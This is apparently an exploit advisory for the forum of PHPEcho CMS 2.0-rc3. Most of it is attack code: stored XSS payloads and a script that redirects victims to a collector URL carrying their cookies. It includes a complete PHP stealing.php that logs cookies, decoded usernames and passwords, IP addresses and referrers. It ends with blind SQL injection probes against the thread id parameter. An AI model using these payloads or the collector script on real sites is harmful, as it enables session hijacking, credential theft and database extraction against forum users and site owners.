PHPEcho CMS 2.0-rc3 (forum) XSS Cookie Stealing / Blind Vulnerability
=====================================================================


PHPEcho CMS 2.0-rc3 (forum) XSS Cookie Stealing / Blind Vulnerability
bug found by Jose Luis Gongora Fernandez (a.k.a) JosS

- download: http://sourceforge.net/project/showfiles.php?group_id=186100

~ [XSS]

  The forum allowed insert javascript code and html code.

  PoC:
  "><h1>0wned</h1>
  "><script>alert("JosS b0x");</script>
  
  -----------  

  Cookie Stealing:
  <script>window.location=?http://127.0.0.1/stealing.php?cookie=?+document.cookie</script>

  stealing.php
  <?php
  $archivo = fopen(&#039;log.htm&#039;,&#039;a&#039;);
  $cookie = $_GET[&#039;c&#039;];
  $usuario = $_GET[&#039;id&#039;]; 
  $ip = getenv (&#039;REMOTE_ADDR&#039;);
  $re = $HTTPREFERRER;

  $fecha=date("j F, Y, g:i a");
  fwrite($archivo, &#039;<hr>USER and PASSWORD: &#039;.base64_decode($usuario).&#039;<br>Cookie: &#039;.$cookie.&#039;<br>Pagina: &#039;.$re.&#039;<br> 

  IP: &#039; .$ip. &#039;<br> Date and Time: &#039; .$fecha. &#039;</hr>&#039;);
  fclose($archivo);
  ?>

~ [BLIND]

  PoC:
  /index.php?module=forum&show=thread&id=1 and 1=2 [False]
  /index.php?module=forum&show=thread&id=1 and 1=1 [True]

  /index.php?module=forum&show=thread&id=1 AND SUBSTRING(@@version,1,1)=5
  /index.php?module=forum&show=thread&id=1 AND SUBSTRING(@@version,1,1)=4




